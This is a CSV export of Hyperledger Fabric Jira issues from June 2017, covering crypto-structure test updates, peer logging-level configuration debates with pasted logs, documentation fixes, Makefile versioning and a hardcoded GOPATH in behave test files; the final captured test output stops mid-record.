Modify sdkintegration tests to work with new crypto structure,FAB-4926,18555,17897,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,mastersingh24,mastersingh24,22/Jun/17 8:37 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Jun/17 11:51 PM,v1.0.0-beta,,,v1.0.0,v1.0.0-rc1,fabric-sdk-java,,,,,,0,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,";22/Jun/17 9:50 PM;mastersingh24;5400",,7200,1800,5400,75%,7200,1800,5400,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5bb:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Jun/17 9:50 PM;mastersingh24;https://gerrit.hyperledger.org/r/11005;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
modify networks in fabric-samples to use new crypto structure,FAB-4927,18561,17897,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,mastersingh24,mastersingh24,22/Jun/17 10:20 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Jun/17 10:10 PM,v1.0.0-beta,,,v1.0.0,v1.0.0-rc1,fabric-samples,,,,,,0,,,,,,,,,elli-androulaki,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,";23/Jun/17 11:15 AM;mastersingh24;1500",,3600,2100,1500,41%,3600,2100,1500,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5br:",,,,,,,,,,,,,,,,,,,,,,,elli-androulaki,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jun/17 11:14 AM;mastersingh24;https://gerrit.hyperledger.org/r/11043;;;","23/Jun/17 9:10 PM;elli-androulaki;[~mastersingh24] this CR is merged; shall we move the status to ""DONE""? Is there anything else that you had in mind for this task?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE supports blockchain height query,FAB-4928,18562,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,22/Jun/17 10:53 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 11:10 PM,,,,,,fabric-quality,,,,,,0,quality,,,,,,"PTE supports chainheight etc information using SDK 

channel.queryBlock(),

channel.queryTransaction(),

channel.queryInstantiatedChaincodes()",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy5bz:",,,,,,,,,,,,,,,,,,,,,,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Behave System Test README to specify python 2.7 requirement,FAB-4930,18565,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,latitiah,latitiah,23/Jun/17 12:07 AM,21/Jul/18 3:55 AM,28/Oct/23 3:00 AM,23/Jun/17 4:09 AM,,,,,,fabric-quality,,,,,,0,quality,,,,,,"The behave system tests need to be executed using python 2.7. There are currently package incompatibility issues using python 3.5 with google protobuf.

Also it would be useful to add details for how to work around this and use the virtualenv setup that is specified in the bddtests/ReadME.md file.",,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5cn:",,,,Unset,,Sprint 19 - Quality,,,,,,Unset,,,,,,,,,,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jun/17 12:12 AM;latitiah;https://gerrit.hyperledger.org/r/11009;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"setting CORE_LOGGING_LEVEL to error is not getting reflected in the other peer modules (like gossip, ledger) log level",FAB-4931,18566,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,suryalnvs,suryalnvs,23/Jun/17 12:09 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Jul/17 4:43 AM,v1.0.0-beta,,,v1.0.0,,fabric-peer,,,,,,0,quality,,,,,,"When launching the network, used CORE_LOGGING_LEVEL=ERROR in docker-compose file which is not getting reflected for peer modules like gossip, ledger.

*Steps:*

1) Add CORE_LOGGING_LEVEL=ERROR to peer environment variables in the docker-compose.yml,  launch the network and then run e2e script

2) Check for the logs of any peer, once the test is finished or during the test in another terminal by using the command *docker logs -f peer0.org1.example.com*

3) Observe that the logs should contain the information as shown below
{code}

2017-06-21 17:02:17.465 UTC [kvledger] Commit -> INFO 2025 Channel [mychannel0]: Created block [3405] with 10 transaction(s)
2017-06-21 17:02:18.411 UTC [kvledger] Commit -> INFO 2026 Channel [mychannel0]: Created block [3406] with 10 transaction(s)
2017-06-21 17:02:19.074 UTC [kvledger] Commit -> INFO 2027 Channel [mychannel0]: Created block [3407] with 10 transaction(s)
2017-06-21 17:02:19.390 UTC [kvledger] Commit -> INFO 2028 Channel [mychannel0]: Created block [3408] with 10 transaction(s)
2017-06-21 17:02:20.078 UTC [gossip/state] directMessage -> WARN 2029 Received state transfer request for channel mychannel1 while expecting channel mychannel0 skipping request...
2017-06-21 17:02:20.084 UTC [gossip/state] handleStateResponse -> WARN 202a Payload with sequence number 3397 was received earlier
2017-06-21 17:02:20.086 UTC [gossip/state] handleStateResponse -> WARN 202b Payload with sequence number 3398 was received earlier
2017-06-21 17:02:20.096 UTC [gossip/state] handleStateResponse -> WARN 202c Payload with sequence number 3399 was received earlier
2017-06-21 17:02:20.106 UTC [gossip/state] handleStateResponse -> WARN 202d Payload with sequence number 3400 was received earlier
2017-06-21 17:02:20.108 UTC [gossip/state] handleStateResponse -> WARN 202e Payload with sequence number 3401 was received earlier
2017-06-21 17:02:20.111 UTC [gossip/state] handleStateResponse -> WARN 202f Payload with sequence number 3402 was received earlier
2017-06-21 17:02:20.113 UTC [gossip/state] handleStateResponse -> WARN 2030 Payload with sequence number 3403 was received earlier
2017-06-21 17:02:20.116 UTC [gossip/state] handleStateResponse -> WARN 2031 Payload with sequence number 3404 was received earlier
2017-06-21 17:02:20.123 UTC [gossip/state] handleStateResponse -> WARN 2032 Payload with sequence number 3405 was received earlier
2017-06-21 17:02:20.126 UTC [gossip/state] handleStateResponse -> WARN 2033 Payload with sequence number 3406 was received earlier
2017-06-21 17:02:20.176 UTC [gossip/state] handleStateResponse -> WARN 2034 Payload with sequence number 3407 was received earlier
2017-06-21 17:02:20.176 UTC [gossip/state] directMessage -> WARN 2035 Received state transfer request for channel mychannel1 while expecting channel mychannel0 skipping request...
2017-06-21 17:02:20.178 UTC [kvledger] Commit -> INFO 2036 Channel [mychannel1]: Created block [3396] with 10 transaction(s)
2017-06-21 17:02:20.214 UTC [kvledger] Commit -> INFO 2037 Channel [mychannel1]: Created block [3397] with 10 transaction(s)
2017-06-21 17:02:20.249 UTC [kvledger] Commit -> INFO 2038 Channel [mychannel1]: Created block [3398] with 10 transaction(s)
2017-06-21 17:02:20.286 UTC [kvledger] Commit -> INFO 2039 Channel [mychannel1]: Created block [3399] with 10 transaction(s)
2017-06-21 17:02:20.380 UTC [kvledger] Commit -> INFO 203a Channel [mychannel1]: Created block [3400] with 10 transaction(s)

{code}
which implies that default logging level is still in place even after setting the CORE_LOGGING_LEVEL=ERROR

 

*Expected:*

By setting CORE_LOGGING_LEVEL=ERROR should be reflected to all the peer modules.

*Default:*

peer: info
cauthdsl: warning
gossip: warning
ledger: info
msp: warning
policies: warning
grpc: error",,AdnanChoudhury,muralisr,scottz,suryalnvs,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4937,,,,,,,,,,,,"23/Jun/17 12:51 AM;AdnanChoudhury;with_critical.log;https://jira.hyperledger.org/secure/attachment/11311/with_critical.log","23/Jun/17 12:51 AM;AdnanChoudhury;with_error.log;https://jira.hyperledger.org/secure/attachment/11312/with_error.log",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5cv:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,muralisr,scottz,suryalnvs,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jun/17 12:51 AM;AdnanChoudhury;Observed similar issue with  CORE_LOGGING_LEVEL=ERROR and  also with CORE_LOGGING_LEVEL=CRITICAL set in the docker compose file for peer. In both cases the peer log contains Warn/INFO level entries for gossip and ledger.

Attached the peer log from e2ecli both error level andcritical level warning.;;;","29/Jun/17 1:04 AM;wlahti;This is currently working as designed. CORE_LOGGING_LEVEL sets the overall default logging level and then uses the different component levels (e.g. CORE_LOGGING_GOSSIP, CORE_LOGGING_LEDGER) to override the level for that specific component. 

Perhaps to add flexibility in configuring log levels we should add a CORE_LOGGING_OVERRIDE flag to specify when to use the component override levels? There are many developers who want the currently functionality maintained but I definitely understand the desire to not use the component overrides. ;;;","29/Jun/17 1:22 AM;AdnanChoudhury;[~wlahti] The documentation provided in the sampleconfig/core.yaml indicates that CORE_LOGGING_LEVEL overrides the component logging, not the other way around (or maybe i am reading it wrong?) here is what the file says:

 
{code:java}
logging:
# Default logging levels are specified here.
# Valid logging levels are case-insensitive strings chosen from
# CRITICAL | ERROR | WARNING | NOTICE | INFO | DEBUG
# The logging levels specified here can be overridden in various ways,
 # listed below from strongest to weakest:
 #
 # 1. The --logging-level=<level> command line option overrides all other
 # specifications.
 #
 # 2. The environment variable CORE_LOGGING_LEVEL otherwise applies to
 # all peer commands if defined as a non-empty string.
 #
 # 3. Otherwise, the specifications below apply.
# Default for all modules running within the scope of a peer
{code}
Specifically, it seems to indicate that there are multiple ways to override logging levels, and one of the ways is to use core_logging_level.;;;","29/Jun/17 3:40 AM;AdnanChoudhury;Some relevant discussion is here: https://jira.hyperledger.org/browse/FAB-4937 I will update this JIRA with the summary from there.;;;","29/Jun/17 6:16 AM;AdnanChoudhury;Here is the summary after talking with [~wlahti]

1) The default logging level is INFO (if *no* core_logging_level or *no* component  logging level is specified in the core.yaml)
2) if core_logging_level is set, then all the components (that *don't* have specific log levels mentioned in core.yaml) will follow that level.
3) If a component is mentioned to have a specific logging level, (e.g. `gossip:     warning`), it overrides the core_logging_level.

The comment section of core.yaml would be updated to reflect this.
   ;;;","29/Jun/17 10:30 PM;scottz;I recommend we list ALL components in the core,yaml file, so the user knows what options are available. And, set them all to their defaults, and then comment out all of them! That way, someone could override all settings by setting CORE_LOGGING_LEVEL. If you leave some of the components assigned here, then the user could not easily change them all with single command using CORE_LOGGING_LEVEL.

Additionally, someone could override a single one by uncommenting only that component logging level (or in the environment when starting the network, or later dynamically by command). And yes I agree the wording should be made clear, that specifying any individual component levels anywhere would override CORE_LOGGING_LEVEL.;;;","29/Jun/17 11:35 PM;wlahti;I agree that we should eventually be able to add any component with a log level to override its level in core.yaml. With the current design, however, this is not possible. It can definitely be added in a future release.

The focus of this item will be updating the documentation in core.yaml to accurately reflect the current functionality in v1.0. I've opened FAB-5106 to track this improvement request.;;;","30/Jun/17 1:26 AM;scottz;Sounds good. But I feel I must clarify:
 # When I said ALL, I initially meant ""all components that have logging levels defined"". It sounds like you thought I was asking to add new logging capability to other component areas. I was simply asking to add comment lines in core.yaml for any others that exist already, so the users can know about them. I know when we set CORE_LOGGING_LEVEL to DEBUG it turned on more debug logs - but only for components that were NOT already listed and assigned here.
 #  And I was also asking to comment out the lines that do exist (but still allow those ""default"" settings to be used by each component); otherwise, if all those components are actually assigned here, then setting CORE_LOGGING_LEVEL does not change them.;;;","30/Jun/17 1:28 AM;wlahti;I have pushed a CR to gerrit for review that updates the documentation in core.yaml: https://gerrit.hyperledger.org/r/#/c/11253/;;;","30/Jun/17 1:47 AM;wlahti;[~scottz] The override components section is currently a hard-coded listed of acceptable components. Anything that doesn't already exist in the section will not be used, even if it has a logger defined. ;;;","30/Jun/17 7:08 AM;AdnanChoudhury;[~wlahti] reporting an unexpected behavior: I see that if I set the msp logging level to ERROR via a docker environment variable, I still see WARN level logging in the peer log.

+*Setup:*
+bring-your-first-network from fabric-sample. Added these two lines in the peer-base.yaml (so all peer containers will have these)
{code:java}
- CORE_LOGGING_LEVEL=ERROR
 - CORE_LOGGING_LEDGER=WARNING
 - CORE_LOGGING_MSP=ERROR{code}
 +*Expected*+:
No logs for msp if its lower than ERROR.
+*Observed*+:
all peers have these WARN level logs:
{code:java}
{""log"":""\u001b[33m2017-06-29 21:53:33.523 UTC [msp] getMspConfig -\u003e WARN 001\u001b[0m Intermediate certs folder not found at [/etc/hyperledger/fabric/msp/intermediatecerts]. Skipping. [stat /etc/hyperledger/fabric/msp/intermediatecerts: no such file or directory]\n"",""stream"":""stderr"",""time"":""2017-06-29T21:53:33.523640743Z""}
{""log"":""\u001b[33m2017-06-29 21:53:33.523 UTC [msp] getMspConfig -\u003e WARN 002\u001b[0m TLS intermediate certs folder not found at [/etc/hyperledger/fabric/msp/tlsintermediatecerts]. Skipping. [stat /etc/hyperledger/fabric/msp/tlsintermediatecerts: no such file or directory]\n"",""stream"":""stderr"",""time"":""2017-06-29T21:53:33.523676862Z""}
{""log"":""\u001b[33m2017-06-29 21:53:33.523 UTC [msp] getMspConfig -\u003e WARN 003\u001b[0m crls folder not found at [/etc/hyperledger/fabric/msp/crls]. Skipping. [stat /etc/hyperledger/fabric/msp/crls: no such file or directory]\n"",""stream"":""stderr"",""time"":""2017-06-29T21:53:33.523681098Z""}
{""log"":""2017-06-29 21:53:33.523 UTC [msp] getMspConfig -\u003e INFO 004\u001b[0m MSP configuration file not found at [/etc/hyperledger/fabric/msp/config.yaml]: [stat /etc/hyperledger/fabric/msp/config.yaml: no such file or directory]\n"",""stream"":""stderr"",""time"":""2017-06-29T21:53:33.523684033Z""}{code}
More info:
Tested with RC1. If I set CORE_LOGGING_MSP=INFO it prints all logs info and up.

Please let me know if you think creating a new JIRA for this is better, as this was supposed to be for the doc only.;;;","01/Jul/17 12:37 AM;wlahti;I believe this is just a side effect of the order that the packages are loaded. At the time the MSP code is running at the very start of the peer, the log level specifications from the environment variables/core.yaml haven't been applied. While not exactly ideal, I think as long as these are the only messages that appear the log level controls are working as expected. ;;;","01/Jul/17 4:35 AM;AdnanChoudhury;Created a lowest level bug for this: https://jira.hyperledger.org/browse/FAB-5134
Keeping this JIRA for the doc only, as previously intended.;;;","03/Jul/17 4:44 AM;muralisr;[https://gerrit.hyperledger.org/r/#/c/11253/] fixes this and has been reviewed by [~AdnanChoudhury];;;",,,,,,,,,,,,,,,,,,,,,,,,,
add proper warnings for some config properties in core.yaml,FAB-4933,18569,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,binhn,binhn,binhn,23/Jun/17 12:30 AM,21/Jul/18 3:55 AM,28/Oct/23 3:00 AM,23/Jun/17 10:54 PM,v1.0.0,,,v1.0.0,,fabric-samples,,,,,,0,,,,,,,"We need to add proper warnings for some config properties in the core.yaml so that the admin may clearly follow how to set their values:
 # CouchDB settings
 # Gossip
 # Chaincode deployment timeout no longer used
 # General polish and format of the comment text ",,binhn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5d3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,binhn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Samples doc: fabric-samples/bin is incorrect,FAB-4935,18571,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,nickgaski,Clayton Sims,Clayton Sims,23/Jun/17 12:47 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Jun/17 11:53 PM,,,,Not a Bug,,fabric-docs,,,,,,0,,,,,,,"While following the Hyperledger Samples documentation, I ran into the following problems.    

1) After executing the git and curl commands.   The documentation states

""and places them in the {{fabric-samples/bin}} directory""  

it actually puts them in fabric-samples/release/darwin-amd64/bin directory

 

2) This will also affect the following section discussing updating the path as well. 

 

3) The doc says 

It retrieves the three platform-specific binaries:
[ 32|https://gerrit.hyperledger.org/r/gitweb?p=fabric.git;a=blob;f=docs/source/samples.rst;h=79aaf8afb2aec08c148caa6094174cc978ad35ee;hb=refs/heads/master#l32]   * ``cryptogen``,
[ 33|https://gerrit.hyperledger.org/r/gitweb?p=fabric.git;a=blob;f=docs/source/samples.rst;h=79aaf8afb2aec08c148caa6094174cc978ad35ee;hb=refs/heads/master#l33]   * ``configtxgen``,
[ 34|https://gerrit.hyperledger.org/r/gitweb?p=fabric.git;a=blob;f=docs/source/samples.rst;h=79aaf8afb2aec08c148caa6094174cc978ad35ee;hb=refs/heads/master#l34]   * ``configtxlator``, and
[ 35|https://gerrit.hyperledger.org/r/gitweb?p=fabric.git;a=blob;f=docs/source/samples.rst;h=79aaf8afb2aec08c148caa6094174cc978ad35ee;hb=refs/heads/master#l35]   * ``peer``
 I only see the first 3. I don't see peer subdirectory under bin 

 

 ",,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx2af:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jun/17 11:54 PM;ChristopherFerris;This is not a defect because it was not working from the rc1 tarball but the beta tarball which has the old structure.;;;","24/Jun/17 1:20 AM;Clayton Sims;yep, I realized that late yesterday and told nick, but neglected to close it.   I saw gari open a separate defect for number 3. 

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CORE_LOGGING_LEVEL setting should set the peer subsystems (that are not mentioned in component log-setting) log levels,FAB-4937,18574,16637,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,AdnanChoudhury,scottz,scottz,23/Jun/17 1:29 AM,07/Aug/19 11:36 PM,28/Oct/23 3:00 AM,01/Jul/17 1:14 AM,v1.0.0,,,v1.0.0,,fabric-peer,,,,,,0,,,,,,,"+Test Name+:  FAB_4937_CoreLoggingLevel test

+Component+:  peer, logging

+Description+: Here are the test steps: , 
1. the core logging level is set (critical/error/debug/warn etc.) at the peer via docker compose environment variable. 
2. Then e2ecli is run, and successful completion is observed
3. The log of the peers are checked to see if the log entries conform to the core log level. 

+Artifact Locations+: 

+Network Topology:+ basic e2ecli network of 1 ""solo"" orderer, 2 organizations with 2 peers each

+Client Driver:+  

+Input+:   

+Output+: 
 ",,AdnanChoudhury,scottz,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4931,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5db:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,scottz,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Jun/17 1:05 AM;wlahti;This looks similar (identical?) to FAB-4931. I just added the following comment there: 

""This is currently working as designed. CORE_LOGGING_LEVEL sets the overall default logging level and then uses the different component levels (e.g. CORE_LOGGING_GOSSIP, CORE_LOGGING_LEDGER) to override the level for that specific component. 

Perhaps to add flexibility in configuring log levels we should add a CORE_LOGGING_OVERRIDE flag to specify when to use the component override levels? There are many developers who want the currently functionality maintained but I definitely understand the desire to not use the component overrides."";;;","29/Jun/17 1:15 AM;AdnanChoudhury;The documentation provided in the sampleconfig/core.yaml indicates that CORE_LOGGING_LEVEL overrides the component logging, not the other way around (or maybe i am reading it wrong?) here is what the file says:

 
{code:java}
logging:
# Default logging levels are specified here.
# Valid logging levels are case-insensitive strings chosen from
# CRITICAL | ERROR | WARNING | NOTICE | INFO | DEBUG
# The logging levels specified here can be overridden in various ways,
 # listed below from strongest to weakest:
 #
 # 1. The --logging-level=<level> command line option overrides all other
 # specifications.
 #
 # 2. The environment variable CORE_LOGGING_LEVEL otherwise applies to
 # all peer commands if defined as a non-empty string.
 #
 # 3. Otherwise, the specifications below apply.
# Default for all modules running within the scope of a peer
{code}
Specifically, it seems to indicate that there are multiple ways to override logging levels, and one of the ways is to use core_logging_level.;;;","29/Jun/17 1:22 AM;wlahti;That section should be updated to clarify the usage, especially the line about --logging-level. ;;;","29/Jun/17 1:24 AM;AdnanChoudhury;Ah ok, is there any other documentation/comment on the usage of core-logging-level? [~wlahti];;;","29/Jun/17 1:31 AM;wlahti;No other documentation but there is more planned. I think my earlier comment about covers the current functionality of CORE_LOGGING_LEVEL at the moment but please bring up any questions you may have. I'll be sure to update the comments section of core.yaml to more accurately reflect its usage. We can also consider adding the flag I mentioned to expand the functionality for different use cases/user expectations. ;;;","29/Jun/17 3:37 AM;AdnanChoudhury;Thanks [~wlahti] for the info, a few follow-up questions to clarify the working of the logging:

1) If there is no core_logging_level set *and* no log level mentioned for peer or peer modules in the core.yaml file, what will be logging level of the components? i.e. what is the default logging level of the components?

2) if I set the core_logging_level to DEBUG *and* have no log level mentioned for peer modules in the core.yaml file, then all the modules should log at DEBUG level, is this assumption correct?

3)  if I set the core_logging_level to DEBUG *and* have log level mentioned for *some* peer modules (not all), then all the modules that were not specified by name should log at DEBUG level, and the ones that have specific log levels will log at that specific level, is this assumption correct?

As far as the flag for override goes, I personally don't think its very important, I would be more interested in specifying the expected behavior of the loggings. In that note, it would be nice to know a) what components are there b) and their default logging levels and c) and in core.yaml file, maybe have a commented out line for each component and their defaults.   ;;;","29/Jun/17 4:32 AM;wlahti;# The default level is INFO. 
 # Yes, that should be correct. 
 # Yes, that should be correct. ;;;","01/Jul/17 1:16 AM;AdnanChoudhury;The test description have been changed after the core_logging_level working became clear. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update BASE_VERSION in Makefile to support on-demand fabric-binaries releases,FAB-4941,18580,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,rameshthoomu,rameshthoomu,23/Jun/17 4:15 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Jun/17 10:53 PM,v1.0.0-beta,,,v1.0.0-rc1,,fabric-build,,,,,,0,build-system,,,,,,"Update BASE_VERSION in make dist-all/make release-all targets to build and publish fabric-snapshot binaries frequently to nexus2. Existing BASE_VERSION always take the release version and this is not apply to snapshot releases.

Update BASE_VERSION to PROJECT VERSION in make file so that every time when we perform release based on IS_RELEASE condition PROJECT_VERSION value changes and publish binaries to nexus2 repo.",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx25j:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jun/17 6:46 AM;rameshthoomu;patch has been submitted https://gerrit.hyperledger.org/r/#/c/11027/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Host GOPATH is hardcoded in compose yaml for behave test,FAB-4943,18584,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,shimos,shimos,shimos,23/Jun/17 9:29 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jun/17 3:33 AM,v1.0.0-beta,,,v1.0.0,,fabric-peer,,,,,,0,,,,,,,"Docker-compose yaml files for the new behave tests (test/feature) hardcode the _host_’s GOPATH.
This seems to make behave tests fail in the host where GOPATH is not “/opt/gopath” because /opt/gopath in the container becomes empty.

{noformat}
/opt/go/src/github.com/hyperledger/fabric/test/feature$ behave –tag=-skip
(snip)
    When a user deploys chaincode at path ""github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02"" with [""init"",""a"",""1000"",""b"",""2000""] with name ""mycc"" # steps/endorser_impl.py:43 17.822s
    And I wait ""30"" seconds                                                                                                                                              # steps/basic_impl.py:33 30.030s
    Then the chaincode is deployed                                                                                                                                       # steps/endorser_impl.py:120 3.921s
      Assertion Failed: Expect a = 1000, received from the deploy:
      Captured stdout:
      Create command: ['/bin/bash', '-c', '""CORE_PEER_MSPCONFIGPATH=/var/hyperledger/configs/7a97e56c57a111e7bb510a00a781584e/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp', 'CORE_PEER_LOCALMSPID=org1.example.com', 'CORE_PEER_ID=peer0.org1.example.c
om', 'CORE_PEER_ADDRESS=peer0.org1.example.com:7051', 'peer', 'channel', 'create', '--file', '/var/hyperledger/configs/7a97e56c57a111e7bb510a00a781584e/behavesystest.tx', '--channelID', 'behavesystest', '--timeout', '120', '--orderer', 'orderer2.example.com:7050""']
      [/bin/bash -c ""CORE_PEER_MSPCONFIGPATH=/var/hyperledger/configs/7a97e56c57a111e7bb510a00a781584e/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp CORE_PEER_LOCALMSPID=org1.example.com CORE_PEER_ID=peer0.org1.example.com CORE_PEER_ADDRESS=peer0.or
g1.example.com:7051 peer channel create --file /var/hyperledger/configs/7a97e56c57a111e7bb510a00a781584e/behavesystest.tx --channelID behavesystest --timeout 120 --orderer orderer2.example.com:7050""]: {'cli': ''}
      [/bin/bash -c ""CORE_PEER_MSPCONFIGPATH=/var/hyperledger/configs/7a97e56c57a111e7bb510a00a781584e/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp peer channel join --blockpath /var/hyperledger/configs/7a97e56c57a111e7bb510a00a781584e/behavesystes
t.block""]:
      [/bin/bash -c ""CORE_PEER_MSPCONFIGPATH=/var/hyperledger/configs/7a97e56c57a111e7bb510a00a781584e/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp CORE_PEER_LOCALMSPID=org2.example.com CORE_PEER_ID=peer1.org2.example.com CORE_PEER_ADDRESS=peer1.or
g2.example.com:7051 peer chaincode install --name mycc --version 0 --path github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02 --orderer orderer2.example.com:7050 ""]: {'peer1.org2.example.com': '', 'peer0.org1.example.com': '', 'peer1.org1.example.com'
: '', 'peer0.org2.example.com': ''}
      [/bin/bash -c ""CORE_PEER_MSPCONFIGPATH=/var/hyperledger/configs/7a97e56c57a111e7bb510a00a781584e/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp CORE_PEER_TLS_ROOTCERT_FILE=/var/hyperledger/configs/7a97e56c57a111e7bb510a00a781584e/peerOrganizati
ons/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt CORE_PEER_LOCALMSPID=org1.example.com CORE_PEER_ID=peer0.org1.example.com CORE_PEER_ADDRESS=peer0.org1.example.com:7051 peer chaincode instantiate --name mycc --version 0 --channelID behavesystest --ctor '{\""Ar
gs\"": [\""init\"",\""a\"",\""1000\"",\""b\"",\""2000\""]}' --orderer orderer2.example.com:7050 ""]: {'peer0.org1.example.com': ''}
